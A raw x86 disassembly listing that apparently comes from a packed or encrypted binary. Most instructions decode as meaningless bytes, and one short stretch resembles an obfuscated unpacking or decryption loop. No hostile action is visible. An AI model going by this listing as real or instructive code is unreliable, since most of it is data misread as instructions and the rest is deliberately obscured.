  40d9b4:	push   edx
  40d9b5:	or     eax,0x7b05206
  40d9ba:	adc    BYTE PTR [edi],ah
  40d9bc:	fiadd  DWORD PTR [edx]
  40d9be:	repnz pop eax
  40d9c0:	adc    DWORD PTR [eax+eax*8+0x24],0x5a
  40d9c5:	xchg   cx,dx
  40d9c8:	inc    ecx
  40d9c9:	dec    edi
  40d9ca:	xor    BYTE PTR [ecx],0x4f
  40d9cd:	pop    edx
  40d9ce:	add    al,0x92
  40d9d0:	call   0xb6f8c2cf
  40d9d5:	call   0xf6b7690c
  40d9da:	and    esp,ebx
  40d9dc:	lea    ecx,ds:0x9be5601d
  40d9e2:	mov    eax,fs
  40d9e4:	sbb    eax,ecx
  40d9e6:	and    esp,eax
  40d9e8:	mov    esp,0x3bac0db2
  40d9ed:	test   DWORD PTR [ebx-0x7286a68d],0x70eb9694
  40d9f7:	rcl    BYTE PTR [esp+ebx*8],cl
  40d9fa:	and    BYTE PTR [esi+eax*2+0x42763bec],dh
  40da01:	dec    ebp
  40da02:	dec    edi
  40da03:	sub    cl,bh
  40da05:	mov    eax,ds:0xe022ca03
  40da0a:	and    edx,ecx
  40da0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da0d:	ret    0x5ea3
  40da10:	sub    al,0xfb
  40da12:	sbb    eax,0xbba011fe
  40da17:	scas   eax,DWORD PTR es:[edi]
  40da18:	sub    DWORD PTR [edi+0x7d09448],0x17
  40da1f:	adc    esi,DWORD PTR [edi+esi*8]
  40da22:	test   ebx,0xfb4cb206
  40da28:	mov    ch,0xf1
  40da2a:	(bad)  
  40da2b:	cmovl  esi,eax
  40da2e:	jmp    0x40da25
  40da30:	jne    0x40da72
  40da32:	aaa    
  40da33:	(bad)  
  40da34:	cmp    eax,0x7eac5e3e
  40da39:	loopne 0x40da99
  40da3b:	and    eax,DWORD PTR [eax+0x3fb02fd7]
  40da41:	ss stos BYTE PTR es:[edi],al
  40da43:	sbb    al,0x50
  40da45:	sub    DWORD PTR [eax+0x74],esi
  40da48:	adc    ch,dh
  40da4a:	mov    ah,0xb7
  40da4c:	stos   BYTE PTR es:[edi],al
  40da4d:	pushf  
  40da4e:	jno    0x40da0b
  40da50:	fldenv [eax]
  40da52:	cmc    
  40da53:	push   ds
  40da54:	cmp    BYTE PTR [ebp+0x5b],dh
  40da57:	clc    
  40da58:	loop   0x40da2a
  40da5a:	add    esi,DWORD PTR [eax+0x570b0b4]
  40da60:	out    0x65,eax
  40da62:	dec    ecx
  40da63:	mov    edi,0x745e0c06
  40da68:	(bad)  
  40da69:	mov    edx,0xeced89d1
  40da6e:	adc    BYTE PTR [eax-0x78aa29a9],0x36
  40da75:	ss stos BYTE PTR es:[edi],al
  40da77:	xor    eax,0xdb1aa9da
  40da7c:	fist   DWORD PTR [esi+0xe3dd37a]
  40da82:	sub    esp,ecx
  40da84:	into   
  40da85:	and    eax,0x22b9202d
  40da8a:	add    eax,0x3a67519c
  40da8f:	jp     0x40da31
  40da91:	fimul  DWORD PTR [ebx+0x39]
  40da94:	push   edi
  40da95:	push   es
  40da96:	ins    BYTE PTR es:[edi],dx
  40da97:	enter  0x67a0,0x53
  40da9b:	cmp    ebp,DWORD PTR [ebp+0x21]
  40da9e:	arpl   ax,ax
  40daa0:	addr16 mov edx,0xe640de86
  40daa6:	movups XMMWORD PTR [eax],xmm5
  40daa9:	in     al,0xb6
  40daab:	imul   esi,DWORD PTR [eax],0xffffffd8
  40daae:	test   eax,0xd3a0deef
  40dab3:	sbb    eax,0xe0642c44
  40dab8:	ins    DWORD PTR es:[edi],dx
  40dab9:	pop    esi
  40daba:	pop    eax
  40dabb:	xor    BYTE PTR [edx-0x5469f81f],dh
  40dac1:	push   esp
  40dac2:	leave  
  40dac3:	mov    al,0x2d
  40dac5:	inc    esp
  40dac6:	adc    ch,BYTE PTR [ebx-0x22e6538f]
  40dacc:	shl    cl,1
  40dace:	adc    eax,0xffffffe9
  40dad1:	xor    al,0x10
  40dad3:	or     al,0x71
  40dad5:	add    al,0xba
  40dad7:	xor    al,0x2a
  40dad9:	arpl   si,bx
  40dadb:	push   eax
  40dadc:	ins    DWORD PTR es:[edi],dx
  40dadd:	into   
  40dade:	(bad)
  40dae1:	lahf   
  40dae2:	leave  
  40dae3:	out    0x83,al
  40dae5:	cdq    
  40dae6:	stc    
  40dae7:	inc    ecx
  40dae8:	push   0x1f
  40daea:	mov    ah,0xac
  40daec:	mov    eax,0x9751f70d
  40daf1:	fdivp  st(6),st
  40daf3:	push   ebp
  40daf4:	dec    edi
  40daf5:	inc    edx
  40daf6:	inc    edi
  40daf7:	sbb    eax,0x4b5a26d3
  40dafc:	popa   
  40dafd:	sbb    al,0xcc
  40daff:	add    bl,cl
  40db01:	lock push eax
  40db03:	addr16 xchg ecx,eax
  40db05:	sub    cl,BYTE PTR [edi+ebp*8-0x1e]
  40db09:	pop    ebx
  40db0a:	test   esp,0xe785e11e
  40db10:	mov    BYTE PTR [eax+0x72995653],cl
  40db16:	xor    ah,bh
  40db18:	dec    esi
  40db19:	push   ebx
  40db1a:	and    ebx,0x69
  40db1d:	mov    ebp,0x7c2fb937
  40db22:	adc    dh,BYTE PTR [eax-0x735d51f4]
  40db28:	data16 xor al,0x4f
  40db2b:	scas   al,BYTE PTR es:[edi]
  40db2c:	inc    BYTE PTR [edi]
  40db2e:	sbb    eax,0xe9d94fd5
  40db33:	push   esp
  40db34:	lds    ebp,FWORD PTR ds:0x28eef327
  40db3a:	xchg   ebx,eax
  40db3b:	push   cs
  40db3c:	xor    eax,0x2954fce
  40db41:	arpl   WORD PTR [ebx+0x572c4dae],cx
  40db47:	lds    edx,FWORD PTR [edx-0x76]
  40db4a:	mov    ah,0x15
  40db4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db4d:	sbb    eax,0x648ae2
  40db52:	rcl    BYTE PTR [edi-0x58],cl
  40db55:	std    
  40db56:	sub    dl,BYTE PTR [eax+0x73]
  40db59:	cmp    al,0xb1
  40db5b:	(bad)  
  40db5c:	daa    
  40db5d:	pop    ecx
  40db5e:	addps  xmm3,XMMWORD PTR [ecx]
  40db61:	jno    0x40db13
  40db63:	mov    ds:0x13ea2cfa,eax
  40db68:	stc    
  40db69:	mov    al,0xa2
  40db6b:	xchg   DWORD PTR [ebp+0x6f],ecx
  40db6e:	mov    al,ds:0x588200d7
  40db73:	sub    BYTE PTR [esi-0x76],dl
  40db76:	outs   dx,DWORD PTR ds:[esi]
  40db77:	es cmp al,0x7d
  40db7a:	add    edx,DWORD PTR [eax]
  40db7c:	test   ecx,0xd11b44a1
  40db82:	test   DWORD PTR [edi+0x4ed8f28],ecx
  40db88:	mov    al,0xdd
  40db8a:	(bad)
  40db8d:	arpl   WORD PTR [edi-0x4b],bx
  40db90:	push   edi
  40db91:	pusha  
  40db92:	lea    ebx,[ecx+0x5a]
  40db95:	inc    ecx
  40db96:	popa   
  40db97:	adc    DWORD PTR [ebp-0x165f6fec],0xdb07c51a
  40dba1:	stc    
  40dba2:	xchg   ebp,eax
  40dba3:	or     al,0x7a
  40dba5:	add    BYTE PTR gs:[edi-0x4],dh
  40dba9:	and    eax,0x3352d467
  40dbae:	ror    eax,1
  40dbb0:	rcr    BYTE PTR [edx+0x10],0x69
  40dbb4:	add    BYTE PTR [edi-0x730b1703],0x1f
  40dbbb:	pop    ecx
  40dbbc:	out    0xc5,eax
  40dbbe:	pop    ecx
  40dbbf:	push   ebx
  40dbc0:	test   al,0x53
  40dbc2:	and    al,0x3a
  40dbc4:	mov    ds:0xabccde9d,al
  40dbc9:	xlat   BYTE PTR ds:[ebx]
  40dbca:	retf   0x87f1
  40dbcd:	cmp    esp,0x21
  40dbd0:	push   esi
  40dbd1:	xchg   ebx,eax
  40dbd2:	mov    esi,0xe3aabe41
  40dbd7:	add    al,0x7d
  40dbd9:	mov    bl,0x7e
  40dbdb:	bound  ebp,QWORD PTR [ebp-0x58]
  40dbde:	pop    ecx
  40dbdf:	mov    cl,0xe9
  40dbe1:	in     al,dx
  40dbe2:	lods   al,BYTE PTR ds:[esi]
  40dbe3:	int    0x96
  40dbe5:	xlat   BYTE PTR ds:[ebx]
  40dbe6:	sub    ebx,ebx
  40dbe8:	sub    edi,DWORD PTR fs:[edx-0x47b3f0b5]
  40dbef:	nop
  40dbf0:	sbb    al,0xd9
  40dbf2:	ja     0x40dc6a
  40dbf4:	or     ch,BYTE PTR [esi+0x69]
  40dbf7:	hlt    
  40dbf8:	jae    0x40dbf1
  40dbfa:	pusha  
  40dbfb:	add    esp,ebx
  40dbfd:	push   eax
  40dbfe:	aam    0x34
  40dc00:	xchg   esp,eax
  40dc01:	xor    DWORD PTR [edi+0x7f],ecx
  40dc04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc05:	mov    eax,0x51f41f13
  40dc0a:	cmp    eax,0xe9fbde1f
  40dc0f:	pop    esi
  40dc10:	jge    0x40dc00
  40dc12:	int    0x24
  40dc14:	test   BYTE PTR [eax+eax*1-0x5b],dl
  40dc18:	inc    eax
  40dc19:	aas    
  40dc1a:	dec    edx
  40dc1b:	in     al,0xb2
  40dc1d:	jbe    0x40dbe4
  40dc1f:	mov    ch,0xe3
  40dc21:	ins    DWORD PTR es:[edi],dx
  40dc22:	mov    ebp,ebp
  40dc24:	rcl    DWORD PTR [eax*1+0x7ebd34f8],1
  40dc2b:	adc    eax,0x77bed82d
  40dc30:	ret    
  40dc31:	(bad)
  40dc35:	and    al,0x9
  40dc37:	out    dx,eax
  40dc38:	fs dec ebx
  40dc3a:	scas   al,BYTE PTR es:[edi]
  40dc3b:	lods   eax,DWORD PTR ds:[esi]
  40dc3c:	scas   al,BYTE PTR es:[edi]
  40dc3d:	dec    BYTE PTR ds:0xb8499fcb
  40dc43:	mov    ds:0xb1523a90,eax
  40dc48:	loop   0x40dc7b
  40dc4a:	fcom   QWORD PTR [ecx+0x4eb098ea]
  40dc50:	rol    DWORD PTR [ebx-0x53ab7617],0x86
  40dc57:	ins    BYTE PTR es:[edi],dx
  40dc58:	inc    esi
  40dc59:	ficomp WORD PTR [eax]
  40dc5b:	dec    ebx
  40dc5c:	cwde   
  40dc5d:	and    ebx,DWORD PTR [edi+0x19]
  40dc60:	pop    esi
  40dc61:	add    eax,0x44535491
  40dc66:	jnp    0x40dcb0
  40dc68:	cmp    edx,ebp
  40dc6a:	clc    
  40dc6b:	mov    cl,0xc0
  40dc6d:	stos   DWORD PTR es:[edi],eax
  40dc6e:	bswap  esp
  40dc70:	mov    dh,0xb1
  40dc72:	std    
  40dc73:	loope  0x40dc5a
  40dc75:	push   ebp
  40dc76:	jl     0x40dc82
  40dc78:	or     ch,bl
  40dc7a:	cli    
  40dc7b:	jge    0x40dcd1
  40dc7d:	sub    al,0xdd
  40dc7f:	aad    0xa1
  40dc81:	jmp    0x40dc90
  40dc83:	jae    0x40dc6b
  40dc85:	sub    DWORD PTR fs:[ebp+0x50e53d86],0x21
  40dc8d:	(bad)  
  40dc8e:	push   esp
  40dc8f:	cwde   
  40dc90:	cmp    al,0x66
  40dc92:	addr16 fdivrp st(7),st
  40dc95:	mov    ebp,edi
  40dc97:	fs jmp 0x40dce5
  40dc9a:	test   DWORD PTR [eax-0x25],ebp
  40dc9d:	push   edx
  40dc9e:	xchg   DWORD PTR [esp+eiz*4-0x5f23046e],esp
  40dca5:	and    bp,WORD PTR [esi+0x38]
  40dca9:	idiv   cl
  40dcab:	out    dx,al
  40dcac:	mov    edi,0x5b2102da
  40dcb1:	xchg   ebp,eax
  40dcb2:	ror    dl,1
  40dcb4:	addr16 xchg ebx,eax
  40dcb6:	xchg   DWORD PTR [edx+ebx*8+0xc6b5054],edi
  40dcbd:	mov    ch,0xde
  40dcc0:	jo     0x40dce2
  40dcc2:	in     al,0xf2
  40dcc4:	sub    BYTE PTR [ecx],cl
  40dcc6:	sar    BYTE PTR [edx-0x74],0x8
  40dcca:	int3   
  40dccb:	test   eax,0x8283b184
  40dcd0:	sub    BYTE PTR [ebp+0x39728d18],bl
  40dcd6:	sbb    ch,dl
  40dcd8:	mov    edx,0x63d431c2
  40dcdd:	adc    bl,BYTE PTR [ebp+0x2be74b26]
  40dce3:	xor    al,0xa3
  40dce5:	stos   BYTE PTR es:[edi],al
  40dce6:	nop
  40dce7:	xchg   ebx,eax
  40dce8:	or     BYTE PTR [edx],0x24
  40dceb:	xor    al,0xd8
  40dced:	jmp    0x5c33:0xc0e8830
  40dcf4:	or     eax,0xb9999887
  40dcf9:	pop    ds
  40dcfa:	xor    edi,DWORD PTR [edi+0x90e4044]
  40dd00:	sbb    ah,BYTE PTR [ecx]
  40dd02:	pop    ebp
  40dd03:	lods   al,BYTE PTR ds:[esi]
  40dd04:	sub    bh,dl
  40dd06:	sub    esi,ebx
  40dd08:	sub    eax,0xf0f95ce8
  40dd0d:	inc    edx
  40dd0e:	cli    
  40dd0f:	push   ebx
  40dd10:	pop    ebp
  40dd11:	pop    esp
  40dd12:	pop    esi
  40dd13:	push   cs
  40dd14:	sbb    al,0xc6
  40dd16:	mov    al,ds:0xf19319b4
  40dd1b:	(bad)  
  40dd1c:	imul   ebx,ebp,0xd2e3f86d
  40dd22:	ds pop edx
  40dd24:	and    BYTE PTR [ebp-0x56],cl
  40dd27:	cwde   
  40dd28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd29:	jno    0x40dcfe
  40dd2b:	ins    DWORD PTR es:[edi],dx
  40dd2c:	out    dx,al
  40dd2d:	mov    ecx,0xb8885661
  40dd32:	in     eax,dx
  40dd33:	inc    eax
  40dd34:	iret   
  40dd35:	cmp    edi,DWORD PTR [esi-0x4ebfced4]
  40dd3b:	std    
  40dd3c:	dec    esp
  40dd3d:	mul    DWORD PTR [edx-0x6263bec0]
  40dd43:	mov    bh,dh
  40dd45:	lods   eax,DWORD PTR ds:[esi]
  40dd46:	in     al,dx
  40dd47:	add    al,0xab
  40dd49:	xlat   BYTE PTR ds:[ebx]
  40dd4a:	pop    edx
  40dd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd4c:	cmc    
  40dd4d:	mov    DWORD PTR [edx],esp
  40dd4f:	dec    ebx
  40dd50:	pop    ecx
  40dd51:	xchg   ebx,eax
  40dd52:	mov    dh,BYTE PTR [edi]
  40dd54:	jmp    0x4e55abd5
  40dd59:	mov    edx,ebx
  40dd5b:	lods   al,BYTE PTR ds:[esi]
  40dd5c:	(bad)  
  40dd5d:	mov    WORD PTR [edx+0x1b],cs
  40dd60:	leave  
  40dd61:	xor    al,0x3a
  40dd63:	stos   BYTE PTR es:[edi],al
  40dd64:	mov    ecx,0x45e9d0e7
  40dd69:	scas   eax,DWORD PTR es:[edi]
  40dd6a:	dec    esi
  40dd6b:	lea    eax,[esi-0x2238991d]
  40dd71:	arpl   sp,dx
  40dd73:	pop    edx
  40dd74:	and    eax,0x6e8aefe8
  40dd79:	push   es
  40dd7a:	outs   dx,BYTE PTR ds:[esi]
  40dd7b:	xor    dh,BYTE PTR [ebp+0x64d2b2e8]
  40dd81:	inc    ebx
  40dd82:	imul   esi,DWORD PTR [eax+0x26b36090],0x3c
  40dd89:	dec    ecx
  40dd8a:	stc    
  40dd8b:	arpl   WORD PTR [edi-0x4d],di
  40dd8e:	loopne 0x40dd9e
  40dd90:	pop    ebp
  40dd91:	sub    BYTE PTR [eax],ch
  40dd93:	adc    ebp,ebp
  40dd95:	xchg   ebx,eax
  40dd96:	shl    BYTE PTR [ecx+0x46],cl
  40dd99:	xor    ecx,ebx
  40dd9b:	jl     0x40de09
  40dd9d:	lods   eax,DWORD PTR ds:[esi]
  40dd9e:	int3   
  40dd9f:	int3   
  40dda0:	lea    ebx,[esi+ecx*2+0x76]
  40dda4:	dec    edi
  40dda5:	sbb    edi,0x49b9d8bd
  40ddab:	inc    eax
  40ddac:	jb     0x40dd65
  40ddae:	js     0x40dd97
  40ddb0:	ret    
  40ddb1:	dec    ecx
  40ddb2:	inc    eax
  40ddb3:	fisub  DWORD PTR [esi-0x22]
  40ddb6:	add    eax,0xabffcd54
  40ddbb:	xor    bl,cl
  40ddbd:	stos   DWORD PTR es:[edi],eax
  40ddbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddbf:	adc    ebp,eax
  40ddc1:	jnp    0x40dd5f
  40ddc3:	mov    ebx,0x874c594a
  40ddc8:	jmp    0x40de23
  40ddca:	mov    ebp,0xb41b23f1
  40ddcf:	out    dx,al
  40ddd0:	xor    al,0xf8
  40ddd2:	pop    edx
  40ddd3:	aas    
  40ddd4:	das    
  40ddd5:	(bad)  
  40ddd6:	mov    esi,0xec7c8784
  40dddb:	(bad)  
  40dddc:	(bad)  
  40ddde:	xor    eax,0x1581f817
  40dde3:	ret    0x20b8
  40dde6:	push   0x93435847
  40ddeb:	(bad)  
  40dded:	cmp    al,0xcc
  40ddef:	push   ss
  40ddf0:	cli    
  40ddf1:	mov    ds:0xd191572c,al
  40ddf6:	pushf  
  40ddf7:	jge    0x40de21
  40ddf9:	xchg   esp,eax
  40ddfb:	iret   
  40ddfc:	popa   
  40ddfd:	jne    0x40de13
  40ddff:	mov    dl,0x9c
  40de01:	call   edx
  40de03:	sbb    bh,dl
  40de05:	jl     0x40de1f
  40de07:	mov    ebp,DWORD PTR gs:[esi+0x3c]
  40de0b:	lods   eax,DWORD PTR ds:[esi]
  40de0c:	fdiv   DWORD PTR [edx]
  40de0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de0f:	cmp    ah,BYTE PTR [edi]
  40de11:	je     0x40de1c
  40de13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de14:	or     BYTE PTR [esi-0x584c04a9],ah
  40de1a:	int    0xdb
  40de1c:	icebp  
  40de1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de1e:	es push ds
  40de20:	mov    edi,0xe3d24f4e
  40de25:	xchg   ebp,eax
  40de26:	cli    
  40de27:	out    0xd4,eax
  40de29:	push   eax
  40de2a:	pushf  
  40de2b:	inc    ecx
  40de2c:	repnz sub ah,BYTE PTR [esi-0x39]
  40de30:	dec    ebp
  40de31:	ins    DWORD PTR es:[edi],dx
  40de32:	cmp    bl,ch
  40de34:	pusha  
  40de35:	das    
  40de36:	adc    DWORD PTR [eax+0x384921ae],ebp
  40de3c:	jmp    0xb1563449
  40de41:	cld    
  40de42:	or     DWORD PTR [ebp-0x39],eax
  40de45:	movaps XMMWORD PTR [ebp-0x66],xmm2
  40de49:	aam    0xc4
  40de4b:	adc    ebx,DWORD PTR [ebp+0x46]
  40de4e:	xchg   edx,eax
  40de4f:	call   0x543d23df
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0xc1
  40dfd4:	fwait
  40dfd5:	add    eax,0x62d2c50b
  40dfda:	(bad)  
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x30]
  40dfe0:	dec    edi
  40dfe1:	dec    ecx
  40dfe2:	dec    ecx
  40dfe3:	repnz mov ds:0xa919fa1a,eax
  40dfe9:	mov    WORD PTR [ebx],es
  40dfeb:	outs   dx,BYTE PTR ds:[esi]
  40dfec:	mov    ecx,0xffdb420f
  40dff1:	sbb    esp,eax
  40dff3:	mov    eax,0x619294ef
  40dff8:	adc    bl,BYTE PTR [ebx-0x6809c41b]
  40dffe:	mov    ds:0x2df0f2ee,eax
  40e003:	sti    
  40e004:	aad    0x2b
  40e006:	dec    ebx
  40e007:	inc    esi
  40e008:	popa   
  40e009:	mov    ds:0x72c2422,al
  40e00e:	pushf  
  40e00f:	xchg   BYTE PTR [edi+0x48],dl
  40e012:	stc    
  40e013:	mov    edx,0x7b166e1b
  40e018:	int3   
  40e019:	and    eax,0x72b73bc4
  40e01e:	mov    DWORD PTR [ecx],ebp
  40e020:	adc    eax,0x3548471e
  40e025:	lea    ebp,[edi+0x10b1980b]
  40e02b:	mov    dh,0x8b
  40e02d:	addr16 pop es
  40e02f:	mov    dl,0xab
  40e031:	sbb    eax,DWORD PTR [ebx-0x53]
  40e034:	xchg   ebx,eax
  40e035:	push   edi
  40e036:	cli    
  40e037:	(bad)  
  40e038:	in     eax,0xaf
  40e03a:	in     eax,dx
  40e03b:	shl    BYTE PTR [edi+0x76],0x27
  40e03f:	adc    BYTE PTR [eax],0xae
  40e042:	mov    BYTE PTR [ebx],ch
  40e044:	and    eax,0x84b295b3
  40e049:	push   ebx
  40e04a:	lea    esp,[eax+0x7f]
  40e04d:	ss into 
  40e04f:	jbe    0x40e0b3
  40e051:	and    ah,BYTE PTR [ecx+0x5b9b4cf5]
  40e057:	sub    al,0x44
  40e059:	or     DWORD PTR [esi+0x6eb3f15f],edi
  40e05f:	inc    edi
  40e060:	push   0x2f39e6cd
  40e065:	push   es
  40e066:	jbe    0x40e0c4
  40e068:	lock sub BYTE PTR [ebx-0x3c],ah
  40e06c:	call   0xcc9:0x275715be
  40e073:	jecxz  0x40e022
  40e075:	in     eax,0x80
  40e077:	sub    eax,DWORD PTR [edx-0x353c0483]
  40e07d:	sub    dh,0xb0
  40e080:	cld    
  40e081:	inc    ebp
  40e082:	in     al,0x76
  40e084:	and    al,BYTE PTR [esi+0x6d183faa]
  40e08a:	ja     0x40e099
  40e08c:	and    al,0x44
  40e08e:	js     0x40e0ed
  40e090:	js     0x40e0de
  40e092:	ret    0x4c8f
  40e095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e096:	adc    ecx,DWORD PTR [esp+eax*1+0x5272945a]
  40e09d:	mov    WORD PTR [eax+ecx*2+0x3d],es
  40e0a1:	pop    ds
  40e0a2:	mov    eax,ds:0x2e04f377
  40e0a7:	dec    edi
  40e0a8:	mov    cl,0x62
  40e0aa:	loope  0x40e0a7
  40e0ac:	mov    esi,DWORD PTR [ebx]
  40e0ae:	push   edx
  40e0af:	icebp  
  40e0b0:	bound  edx,QWORD PTR [esi+0x897f56e]
  40e0b6:	xchg   DWORD PTR [edx+0x24d48522],eax
  40e0bc:	sub    BYTE PTR [ebx+edi*4+0x6e],0xfe
  40e0c1:	mov    eax,0xf14aca25
  40e0c6:	dec    eax
  40e0c7:	imul   ch
  40e0c9:	lea    ebp,[edx]
  40e0cb:	jbe    0x40e14b
  40e0cd:	or     DWORD PTR [ebx-0x494ccf5e],0x24
  40e0d4:	xchg   edx,eax
  40e0d5:	jge    0x40e084
  40e0d7:	das    
  40e0d8:	xchg   esi,ebp
  40e0da:	dec    ebx
  40e0db:	xlat   BYTE PTR ds:[ebx]
  40e0dc:	into   
  40e0dd:	cs in  al,0x92
  40e0e0:	aad    0x40
  40e0e2:	jmp    0x40e0a1
  40e0e4:	test   BYTE PTR [esi],dh
  40e0e6:	push   edi
  40e0e7:	mov    dh,0x95
  40e0e9:	jle    0x40e0a0
  40e0eb:	xor    dh,BYTE PTR [ecx]
  40e0ed:	push   ds
  40e0ee:	stos   BYTE PTR es:[edi],al
  40e0ef:	bound  esp,QWORD PTR [edx+0x1f3da32b]
  40e0f5:	push   cs
  40e0f6:	jae    0x40e140
  40e0f8:	lods   al,BYTE PTR ds:[esi]
  40e0f9:	or     eax,0x9644a3a9
  40e0fe:	cdq    
  40e0ff:	addr16 loop 0x40e127
  40e102:	xlat   BYTE PTR ds:[ebx]
  40e103:	sti    
  40e104:	sbb    ah,dh
  40e106:	cmp    esp,0x92feba93
  40e10c:	fwait
  40e10d:	xor    BYTE PTR ds:0x86ef51fa,0x3c
  40e114:	(bad)  
  40e115:	pop    ds
  40e116:	add    ax,0x2e7e
  40e11a:	out    dx,al
  40e11b:	enter  0x3d3d,0x47
  40e11f:	ins    BYTE PTR es:[edi],dx
  40e120:	pop    esi
  40e121:	int    0x41
  40e123:	loop   0x40e164
  40e125:	mov    eax,0x87d524a1
  40e12a:	push   DWORD PTR [esi]
  40e12c:	inc    ecx
  40e12d:	sar    DWORD PTR [eax-0x3c],0xb2
  40e131:	sbb    dl,BYTE PTR [edi+0x42]
  40e134:	mov    ebx,0x776e209d
  40e139:	mov    WORD PTR [edi+0x67e8966c],fs
  40e13f:	(bad)  
  40e140:	mov    al,0x8c
  40e142:	sti    
  40e143:	nop
  40e144:	cmp    eax,0x1c29a38e
  40e149:	outs   dx,DWORD PTR ds:[esi]
  40e14a:	mov    edi,0x33553e91
  40e14f:	push   ebx
  40e150:	loopne 0x40e190
  40e152:	fnstcw WORD PTR [ebx]
  40e154:	push   0xffffffa0
  40e156:	adc    dl,BYTE PTR [esi]
  40e158:	jl     0x40e10a
  40e15a:	cld    
  40e15b:	and    DWORD PTR [ebx+0x17],eax
  40e15e:	push   esp
  40e15f:	retf   0x3fa7
  40e162:	and    dh,bl
  40e164:	push   edi
  40e165:	push   cs
  40e166:	inc    edi
  40e167:	inc    edx
  40e168:	(bad)  
  40e169:	adc    bl,bh
  40e16b:	and    dh,BYTE PTR ds:0xb0fece32
  40e171:	pop    ecx
  40e172:	into   
  40e173:	pop    edi
  40e174:	mov    ds,WORD PTR [eax]
  40e176:	clc    
  40e177:	jle    0x40e137
  40e179:	loope  0x40e131
  40e17b:	mov    ss,WORD PTR [edi-0x50ba9323]
  40e181:	add    DWORD PTR [eax+edi*1+0x5],eax
  40e185:	xchg   ecx,eax
  40e186:	push   0x4df67391
  40e18b:	sub    DWORD PTR [edi],0x71
